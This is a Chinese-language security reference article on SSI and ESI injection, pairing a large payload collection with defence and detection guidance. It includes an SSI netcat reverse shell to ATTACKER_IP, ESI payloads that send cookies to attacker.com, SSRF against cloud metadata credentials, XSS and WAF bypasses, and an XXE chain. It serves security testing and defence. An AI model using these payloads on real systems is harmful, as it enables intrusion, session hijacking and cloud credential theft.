---
attack_surface: [注入类, 缓存/代理逻辑]
impact: [远程代码执行, 信息泄露, 身份伪造]
risk_level: 高
prerequisites:
  - HTTP 缓存/代理架构理解
  - SSI/ESI 基础语法
related_techniques:
  - xslt-server-side-injection
  - cache-poisoning
  - ssrf-server-side-request-forgery
  - xss-cross-site-scripting
  - crlf-injection
  - http-request-smuggling
difficulty: 中级
tools:
  - Burp Suite ESI Injector
  - ssi_esi.txt (fuzz wordlist)
---

# SSI 与 ESI 注入漏洞专题

# 0x01 Server Side Inclusion (SSI) 注入

## 1.1 基础概念

SSI 是一种简单的服务端脚本语言，用于在 HTML 页面被发送到客户端之前，将动态内容（如当前时间、文件内容、CGI 脚本输出）嵌入到静态页面中。

- **文件后缀**：常见于 `.shtml`、`.shtm`、`.stm`。
- **基本语法**：`<!--#directive param="value" -->`，如：`<!--#echo var="DATE_LOCAL" -->`，输出：`Tuesday, 15-Jan-2013 19:28:54 EST`
- **常见 Web Server 支持**：
  - Apache（`mod_include`）
  - Nginx（需显式开启）
  - IIS（较少见）
- **触发条件**：
  - 页面被当作 SSI 解析（不是所有 HTML 都会解析）
  - 通常需满足：
    - 文件后缀：`.shtml` / `.shtm` / `.stm`
    - 或配置：`Options +Includes`

---

## 1.2 常用指令与攻击 Payload

### 1.2.1 常用指令

| 指令       | 说明             |
| ---------- | ---------------- |
| `echo`     | 输出变量         |
| `include`  | 包含文件         |
| `exec`     | 执行命令或 CGI   |
| `config`   | 设置环境         |
| `printenv` | 输出所有环境变量 |
| `set`      | 设置变量         |

### 1.2.2 攻击 Payload

若应用在页面中反射了用户输入且支持 SSI 指令，可导致敏感信息泄露甚至 RCE。

| **指令功能**        | **典型 Payload**                                             | 备注                                                         |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **显示文件名/日期** | <!--#echo var="DATE_LOCAL" -->                               |                                                              |
| **列出环境变量**    | <!--#echo var="DATE_LOCAL" --><br/><!--#echo var="DOCUMENT_ROOT" --><br/><!--#printenv --> |                                                              |
| **文件包含 (LFI)**  | <!--#include file="/etc/passwd" --><br/><!--#include virtual="/index.php" --> | `file`：相对路径（受限制）<br />`virtual`：URL 路径（更常用） |
| **CGI 程序执行**     | <!--#include virtual="/cgi-bin/counter.pl" -->               | 通过 CGI 路径执行服务端脚本                                   |
| **文件修改时间**     | <!--#flastmod file="index.html" -->                          | 泄露文件最后修改时间，辅助信息收集                             |
| **设置变量**         | <!--#set var="name" value="Rich" -->                         | 配合其他指令（echo/include）实现动态内容注入                   |
| **命令执行 (RCE)**  | <!--#exec cmd="id" --><br/><!--#exec cmd="whoami" --><br /><!--#exec cgi="/cgi-bin/test.cgi" --> |                                                              |
| **反弹 Shell**      | <!--#exec cmd="mkfifo /tmp/foo;nc ATTACKER_IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" --> | `/bin/bash` 可用<br />服务器允许 `exec`                      |

# 0x02 Edge Side Inclusion (ESI) 注入

## 2.1 基础概念

ESI 是一种标记语言，通常在 **CDN（如 Akamai、Cloudflare）** 或 **缓存代理（如 Varnish、Squid）** 这一层运行。它允许缓存服务器从不同的源抓取动态片段并拼接到缓存的静态模板中。

## 2.2 **基础语法**

**ESI 使用 XML 风格标签：**

```xml
<esi:include src="URL" />
```

**示例：**

```xml
<esi:include src="/header.html"/>
```

**带变量示例：**

```xml
<esi:include src="/profile?id=$(QUERY_STRING{user})"/>
```

**ESI 变量：**

- `$(HTTP_COOKIE)`
- `$(HTTP_USER_AGENT)`
- `$(QUERY_STRING)`
- `$(REMOTE_ADDR)`

**常见标签：**

| 标签                        | 功能              |
| --------------------------- | ----------------- |
| `esi:include`               | 引入远程/本地资源 |
| `esi:vars`                  | 使用变量          |
| `esi:remove`                | 条件删除          |
| `esi:choose/when/otherwise` | 条件判断          |

## 2.2 指纹识别

- **响应头**：`Surrogate-Control: content="ESI/1.0"`。
- **盲测 (Blind)**：`hell<!--esi-->o`。如果返回 `hello`，说明存在 ESI 解析。
- **外带 (OOB)**：`<esi:include src="http://attacker.com">`，检查攻击者服务器是否有请求记录。
- **敏感资源读取**：`<esi:include src="supersecret.txt">`，检查是否有奇怪的资源响应。
- **针对 Akamai 的识别指纹**：`<esi:debug/>`

## 2.3 ESI 漏洞利用

### 2.3.1 ESI 利用参考

- **Includes**: 支持 `<esi:includes>` 指令
- **Vars**: 支持 `<esi:vars>` 指令。用于绕过 XSS 过滤器
- **Cookie**: 文档 cookies 对 ESI 引擎可访问
- **Upstream Headers Required**: 代理应用程序不会处理 ESI 语句，除非上游应用程序提供头信息
- **Host Allowlist**: 在这种情况下，ESI 包含仅可能来自允许的服务器主机，使得 SSRF 例如仅可能针对这些主机

|          **软件**           | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :-------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|           Squid3            |     Yes      |   Yes    |     Yes     |              Yes              |         No         |
|        Varnish Cache        |     Yes      |    No    |     No      |              Yes              |        Yes         |
|           Fastly            |     Yes      |    No    |     No      |              No               |        Yes         |
| Akamai ESI 测试服务器 (ETS) |     Yes      |   Yes    |     Yes     |              No               |         No         |
|         NodeJS esi          |     Yes      |   Yes    |     Yes     |              No               |         No         |
|        NodeJS nodesi        |     Yes      |    No    |     No      |              No               |      Optional      |

### 2.3.2 ESI 攻击矩阵

------

#### **2.3.2.1 总览**

| 能力类型           | 本质                 | 典型危害        |
| ------------------ | -------------------- | --------------- |
| **资源加载控制**   | 控制 `<esi:include>` | SSRF / 文件读取 |
| **变量解析**       | 访问 `$(...)`        | Cookie 泄露     |
| **响应修改**       | Header / Body 注入   | XSS / 重定向    |
| **解析器特性滥用** | ESI / XSLT           | XXE / RCE       |
| **解析绕过**       | WAF / 浏览器过滤绕过 | 高隐蔽攻击      |

------

#### 2.3.2.2 **利用**

------

##### 1️⃣ SSRF（最核心能力）

###### ✔ 原语

```html
<esi:include src="URL"/>
```

------

###### ✔ Payload

```html
<esi:include src="http://127.0.0.1/admin"/>
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://internal.service/config"/>
```

------

###### ✔ 利用条件

- ESI 在 CDN / 代理层解析
- 无 URL 限制或白名单不严

------

###### ✔ 风险等级

🔥🔥🔥🔥🔥（极高）

------

###### ✔ 实战要点

- 优先打：
  - 云 metadata（AWS / GCP）
  - 内网管理接口（Jenkins / Docker API）
- SSRF 来源是 **CDN 节点 IP**（绕过内网限制）

------

##### 2️⃣ Cookie 窃取（绕过 HttpOnly ⭐）

------

###### ✔ 原语

```html
$(HTTP_COOKIE)
```

------

###### ✔ Payload

```html
<esi:include src="http://attacker.com/$(HTTP_COOKIE)"/>
```

指定 Cookie：

```html
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})"/>
```

------

###### ✔ 利用条件

- ESI 支持变量解析
- 外部请求允许

------

###### ✔ 风险等级

🔥🔥🔥🔥🔥（极高）

------

###### ✔ 实战要点

- **直接读取 HttpOnly Cookie（极少见能力）**
- 比 XSS 更强（因为在服务端执行）

------

##### 3️⃣ XSS（边缘层注入）

------

###### ✔ 原语

- 响应拼接
- header 控制
- HTML 注入

------

###### ✔ Payload

① 基础 XSS

```html
<esi:include src=http://attacker.com/xss.html>
```

------

② 绕过 Chrome XSS Filter

```html
<esi:assign name="var1" value="'cript'"/>
<s<esi:vars name="$(var1)"/>>alert(1)</s<esi:vars name="$(var1)"/>>
```

------

③ WAF 绕过

```html
<scr<!--esi-->ipt>alert(1)</scr<!--esi-->ipt>
<img src=x on<!--esi-->error=alert(1)>
```

------

④ 反射型（结合变量）

```html
<!--esi $(HTTP_COOKIE) -->
```

------

###### ✔ 利用条件

- 响应中反射用户输入
- ESI 在响应阶段执行

------

###### ✔ 风险等级

🔥🔥🔥🔥（高）

------

###### ✔ 实战要点

- 绕过：
  - WAF
  - CSP（部分情况）
- 可打缓存投毒 → 全站 XSS

------

##### 4️⃣ 本地文件读取（Edge LFI）

------

###### ✔ 原语

```html
<esi:include src="file"/>
```

------

###### ✔ Payload

```html
<esi:include src="secret.txt"/>
```

------

###### ✔ 利用条件

- ESI 引擎允许本地路径

------

###### ✔ 风险等级

🔥🔥🔥（中高）

------

###### ✔ 实战要点

- 与传统 LFI 不同：
  - 执行在 CDN / Proxy 层
- 可读取：
  - 缓存文件
  - 配置文件

------

##### 5️⃣ 响应头注入 / Open Redirect

------

###### ✔ 原语

```html
$add_header()
```

------

###### ✔ Payload

Open Redirect

```html
<!--esi $add_header('Location','http://attacker.com') -->
```

------

修改 Content-Type（XSS 绕过）

```html
<!--esi $add_header('Content-Type','text/html') -->
```

------

组合攻击

```html
<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode(...) /-->
```

------

###### ✔ 利用条件

- 支持 header 操作

------

###### ✔ 风险等级

🔥🔥🔥🔥（高）

------

###### ✔ 实战要点

- 绕过：
  - `Content-Type: application/json`
- 可变为：
  - HTML → 执行 JS

------

##### 6️⃣ CRLF 注入（请求走私辅助）

------

###### ✔ Payload

```html
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:127.0.0.1"/>
```

------

###### ✔ 高级（CVE-2019-2438）

```html
<esi:request_header name="User-Agent" value="12345
Host: evil.com"/>
```

------

###### ✔ 利用条件

- ESI 未过滤 CRLF

------

###### ✔ 风险等级

🔥🔥🔥🔥（高）

------

###### ✔ 实战要点

- 可结合：
  - 请求走私
  - 伪造源 IP

------

##### 7️⃣ Header 注入（请求级控制）

------

###### ✔ Payload

```html
<esi:include src="http://example.com">
  <esi:request_header name="User-Agent" value="evil"/>
</esi:include>
```

------

###### ✔ 利用条件

- 支持 `esi:request_header`

------

###### ✔ 风险等级

🔥🔥🔥（中高）

------

###### ✔ 实战要点

- 用于：
  - 绕过认证
  - SSRF 精细化利用

------

##### 8️⃣ XXE（ESI + XSLT ⭐ 高级）

------

###### ✔ 原语

```html
dca="xslt"
```

------

###### ✔ Payload

```html
<esi:include 
  src="http://host/poc.xml"
  dca="xslt"
  stylesheet="http://host/poc.xsl"/>
```

------

###### ✔ 恶意 XSLT

```xml
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file">]>
<foo>&xxe;</foo>
```

------

###### ✔ 利用条件

- 支持 XSLT
- 未禁用外部实体

------

###### ✔ 风险等级

🔥🔥🔥🔥🔥（极高）

------

###### ✔ 实战要点

- 可实现：
  - 文件读取
  - SSRF
  - 内网扫描
- 详见 XSLT Server Side Injection 专题：[XSLT Server Side Injection — ZhaoHuaXiShi 知识库](../../Proxies/XSLT%20Server%20Side%20Injection/README.md)

------

##### 9️⃣ 调试信息泄露（Akamai 特性）

------

###### ✔ Payload

```html
<esi:debug/>
```

------

###### ✔ 适用对象

- Akamai

------

###### ✔ 风险等级

🔥🔥（中）

------

###### ✔ 实战要点

- 泄露：
  - 内部路径
  - 处理逻辑
  - 节点信息

---

# 0x03 SSI 与 ESI 的利害对比

| **维度**     | **SSI (Server Side)**            | **ESI (Edge Side)**                       |
| ------------ | -------------------------------- | ----------------------------------------- |
| **执行位置** | Web 服务器 (Apache/Nginx/IIS)    | 边缘节点/缓存代理 (Varnish/CDN)           |
| **触发点**   | 文件解析                         | 响应解析                                  |
| **核心威胁** | **RCE (命令执行)**、敏感文件泄露 | **SSRF**、**Cookie 窃取 (绕过 HttpOnly)** |
| **隐蔽性**   | 较低，常依赖特定后缀             | 较高，可能被 WAF/后端完全忽略             |

------

# 0x04 职业实践建议（朝花夕拾）

## 4.1 重点入口

优先测试：

- 搜索框 `/search?q=`
- 评论 `/comment`
- 用户资料 `/profile`
- Header 注入（User-Agent / Referer）

## 4.2 链式攻击路径

### 🔥 链 1：ESI → SSRF → 云接管

```text
ESI 注入
 → 访问 169.254.169.254
 → 获取凭证
 → 接管云资源
```

------

### 🔥 链 2：ESI → Cookie → 会话劫持

```text
$(HTTP_COOKIE)
 → 外带
 → 登录态接管
```

------

### 🔥 链 3：ESI → Header → XSS

```text
修改 Content-Type
 → JSON → HTML
 → 执行 JS
```

------

### 🔥 链 4：ESI → Cache Poisoning → 全站攻击

```text
注入 ESI
 → CDN缓存
 → 所有用户执行 payload
```

------

## 4.3 云环境重点

获取 `AWS AK/SK`、`Token`

```html
<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
```

## 4.4 与缓存投毒结合

ESI + Cache Poisoning：

```
注入 ESI → CDN缓存污染 → 所有用户被攻击
```

## 4.5 在进行城市级系统安全评估或数据安全审计时，应注意以下隐蔽路径：

1. **缓存层绕过**：许多 WAF 部署在 Web 服务器前端，但如果 ESI 标签是在后端被注入，然后在返回过程中由 CDN 解析，则可以绕过传统的输入过滤。
2. **Cookie 泄露风险**：在审计带有高强度 Cookie 保护（如 `HttpOnly`, `SameSite`）的系统时，务必检查是否存在 ESI 注入。这是**极少数能让攻击者直接在服务端读取并发送 HttpOnly Cookie** 的手段。
3. **内网探测**：ESI 产生的 SSRF 通常源于 CDN 节点或企业边缘代理，这使得攻击者可以探测原本不可达的内部管理接口（如 Varnish 的管理后台或集群内网资源）。

------

# 0x05 检测与防御

## 5.1 开发层面

1. **禁用 SSI/ESI 解析**（如果业务不需要）：
   - Apache：移除 `mod_include` 或设置 `Options -Includes`
   - Nginx：禁用 `ssi on` 指令
   - Varnish：移除或限制 ESI 处理规则
   - CDN（Akamai/Fastly/Cloudflare）：检查 ESI 是否启用，按需关闭

2. **输入验证**：拒绝或转义包含 SSI/ESI 语法的用户输入：
   ```
   <!--# ... --> / <esi: ... > / $(...) 
   ```

3. **沙箱与限制**：如果必须保留 ESI，实施主机白名单限制 `esi:include` 只能访问受信任的内部主机

4. **响应头控制**：在上游应用中显式设置 `Surrogate-Control: content="ESI/1.0"` 仅对需要 ESI 处理的页面启用

5. **最小权限原则**：SSI 的 `exec cmd` 和 ESI 的 XSLT 转换以最低权限运行

## 5.2 检测层面

- **WAF 规则**：检测请求中 `<esi:`、`<!--#exec`、`$(HTTP_COOKIE)` 等 ESI/SSI 特征
- **RASP**：运行时拦截通过 ESI-include 发起的异常出站请求（尤其是到云 metadata 地址）
- **SAST**：扫描代码中用户输入直接拼入 `.shtml` 模板或经过 ESI 处理器的路径
- **DAST**：使用 ssi_esi.txt 字典对反射点进行 Fuzz

## 5.3 应急响应

- 确认 ESI/SSI 引擎类型和版本（通过 `Surrogate-Control` 响应头、`<esi:debug/>` 等手段）
- 审计 `esi:include` 的出站请求日志，识别已被利用的注入点
- 检查是否有 Cookie 通过 `$(HTTP_COOKIE)` 泄露的证据（外带 DNS/HTTP 日志）
- 如果使用 Akamai，检查 `<esi:debug/>` 是否暴露了内部路径信息

------

# 0x06 Fuzzing 字典与自动化检测

## 6.1 Brute-Force 检测字典

使用 [ssi_esi.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt) 对用户反射点进行 Fuzz：

```bash
# 下载字典并 Fuzz
curl -sL https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/ssi_esi.txt -o /tmp/ssi_esi.txt
ffuf -u 'https://target.com/search?q=FUZZ' -w /tmp/ssi_esi.txt -mr 'root:|www-data|<!--#echo|hello'
```

## 6.2 Burp Suite 自动化

- **插件推荐**：使用 `ESI Injector` 或自定义扫描规则。
- **Fuzz 列表**：重点关注 `/search`、`/comment` 等用户输入会反射到页面中的位置。
- **Intruder 字典**：将 ssi_esi.txt 导入 Burp Intruder 进行参数化 Fuzz。

---

# 0x07 总结

> **ESI 注入 ≠ 模板注入，而是"边缘计算层的 SSRF + 数据窃取 + 响应劫持"综合漏洞。**

---

# 0x08 参考资料

- [Apache mod_include — SSI 官方文档](https://httpd.apache.org/docs/current/howto/ssi.html)
- [GoSecure — Beyond XSS: Edge Side Include Injection (Part 1)](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [GoSecure — ESI Injection Part 2: Abusing Specific Implementations](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
- [InfoSecWriteups — Exploring the World of ESI Injection](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)
- [Auto_Wordlists — ssi_esi.txt Fuzzing Dictionary](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt)
- [XSLT Server Side Injection (关联技术) — ZhaoHuaXiShi 知识库](../../Proxies/XSLT%20Server%20Side%20Injection/README.md)
- [Cache Poisoning & Cache Deception (关联技术) — ZhaoHuaXiShi 知识库](../../Proxies/Cache%20Poisoning%26Cache%20Deception/README.md)
- [SSRF (关联技术) — ZhaoHuaXiShi 知识库](../../User%20input/Reflected%20Values/SSRF/README.md)